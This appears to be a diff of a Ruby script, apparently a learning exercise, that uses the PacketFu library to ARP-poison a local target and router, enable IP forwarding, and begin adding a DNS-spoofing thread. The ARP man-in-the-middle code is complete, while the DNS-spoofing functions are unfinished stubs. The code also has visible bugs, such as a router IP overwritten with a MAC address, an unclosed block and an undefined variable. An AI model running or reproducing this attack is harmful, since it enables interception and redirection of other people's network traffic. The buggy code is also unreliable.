@@ -3,39 +3,10 @@
 require 'packetfu'
 require 'thread'
 
+include 'site.rb'
+
 # Builds on the previous ARP spoofing example.
 # The sending of ARP packets is done in a separate thread. 
-
-target_mac  = "b8:ac:6f:34:ad:d8"
-target_ip   = "192.168.1.101"
-sender_mac  = "7c:7a:91:7d:2b:02"
-sender_ip   = "192.168.1.100"
-router_ip   = "192.168.1.1"
-router_mac  = "00:22:6b:7c:9b:12"
-@iface       = "wlp2s0"
-
-# Construct the target's packet
-arp_packet_target = PacketFu::ARPPacket.new()
-arp_packet_target.eth_saddr = sender_mac       # sender's MAC address
-arp_packet_target.eth_daddr = target_mac       # target's MAC address
-arp_packet_target.arp_saddr_mac = sender_mac   # sender's MAC address
-arp_packet_target.arp_daddr_mac = target_mac   # target's MAC address
-arp_packet_target.arp_saddr_ip = router_ip     # router's IP
-arp_packet_target.arp_daddr_ip = target_ip     # target's IP
-arp_packet_target.arp_opcode = 2               # arp code 2 == ARP reply
- 
-# Construct the router's packet
-arp_packet_router = PacketFu::ARPPacket.new()
-arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
-arp_packet_router.eth_daddr = router_mac       # router's MAC address
-arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
-arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
-arp_packet_router.arp_saddr_ip = target_ip     # target's IP
-arp_packet_router.arp_daddr_ip = router_ip     # router's IP
-arp_packet_router.arp_opcode = 2               # arp code 2 == ARP reply
-
-# Enable IP forwarding
-`echo 1 > /proc/sys/net/ipv4/ip_forward`
 
 def runspoof(arp_packet_target,arp_packet_router)
   # Send out both packets
@@ -48,14 +19,115 @@ def runspoof(arp_packet_target,arp_packet_router)
   end
 end
 
+def get_machine_addr(ip)
+  PacketFu::Utils.arp(ip, :iface => @iface)
+end
+
+def spoof_dns(t_ip)
+  #look for dns packets from target
+  filter = "udp and port 53 and src " + t_ip
+
+  cap = PacketFu::Capture.new(:iface => @iface,
+    :start => true,
+    :promisc => true,
+    :filter=> filter)
+  cap.stream.each do |p|
+    pkt = PacketFu::Packet.parse(p)
+    if pkt.is_udp?
+      dns_packet = pkt.payload[2].to_s + pkt.payload[3].to_s
+
+      #check if query
+      #extract domain name
+      #build response
+      #send response
+
+    end
+end
+
+def extract_domain(q_name)
+  #take q name and extract all subdomains
+
+
+  return nil #string with domain name
+end
+
+def send_dns_response(orig_pkt, name)
+
+  #UDP/IP headers
+  dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
+  dns_resp.udp_src = orig_pkt.udp_dst
+  dns_resp.udp_dst = orig_pkt.udp_src
+  dns_resp.ip_saddr = orig_pkt.ip_daddr
+  dns_resp.ip_daddr = @target_ip
+  dns_resp.eth_daddr = @target_mac
+
+  #DNS header
+  #copy transaction ID from original query to response
+  dns_resp.payload = orig_pkt.payload[0,2]
+  #response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
+
+  #Name
+
+  #Spoofed IP
+
+  #Rest of DNS Header (defaults)
+
+  #Bundle and send
+  dns_resp.recalc
+  dns_resp.to_w(@iface)
+end
+
+## Main
+# replace with cmd line or config file?
+@target_ip   = "192.168.1.101"
+@sender_ip   = "192.168.1.100"
+@router_ip   = "192.168.1.1"
+
+=begin
+@target_mac  = "b8:ac:6f:34:ad:d8"
+@sender_mac  = "7c:7a:91:7d:2b:02"
+@router_mac  = "00:22:6b:7c:9b:12"
+=end
+@target_mac = get_machine_addr(@target_ip)
+@sender_mac = get_machine_addr(@sender_ip)
+@router_ip  = get_machine_addr(@router_ip)
+
+@iface      = "wlp2s0"
+
+# Construct the target's packet
+arp_packet_target = PacketFu::ARPPacket.new()
+arp_packet_target.eth_saddr = @sender_mac       # sender's MAC address
+arp_packet_target.eth_daddr = @target_mac       # target's MAC address
+arp_packet_target.arp_saddr_mac = @sender_mac   # sender's MAC address
+arp_packet_target.arp_daddr_mac = @target_mac   # target's MAC address
+arp_packet_target.arp_saddr_ip = @router_ip     # router's IP
+arp_packet_target.arp_daddr_ip = @target_ip     # target's IP
+arp_packet_target.arp_opcode = 2               # arp code 2 == ARP reply
+ 
+# Construct the router's packet
+arp_packet_router = PacketFu::ARPPacket.new()
+arp_packet_router.eth_saddr = @sender_mac       # sender's MAC address
+arp_packet_router.eth_daddr = @router_mac       # router's MAC address
+arp_packet_router.arp_saddr_mac = @sender_mac   # sender's MAC address
+arp_packet_router.arp_daddr_mac = @router_mac   # router's MAC address
+arp_packet_router.arp_saddr_ip = @target_ip     # target's IP
+arp_packet_router.arp_daddr_ip = @router_ip     # router's IP
+arp_packet_router.arp_opcode = 2               # arp code 2 == ARP reply
+
+# Enable IP forwarding
+`echo 1 > /proc/sys/net/ipv4/ip_forward`
+
 begin
   puts "Starting the ARP poisoning thread..."
   spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)} 
+  dns_thread = Thread.new{spoof_dns(target_ip)}
   spoof_thread.join
+  dns_thread.join
   # Catch the interrupt and kill the thread
-  rescue Interrupt
+rescue Interrupt
   puts "\nARP spoof stopped by interrupt signal."
   Thread.kill(spoof_thread)
+  Thread.kill(dns_thread)
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
   exit 0
 end
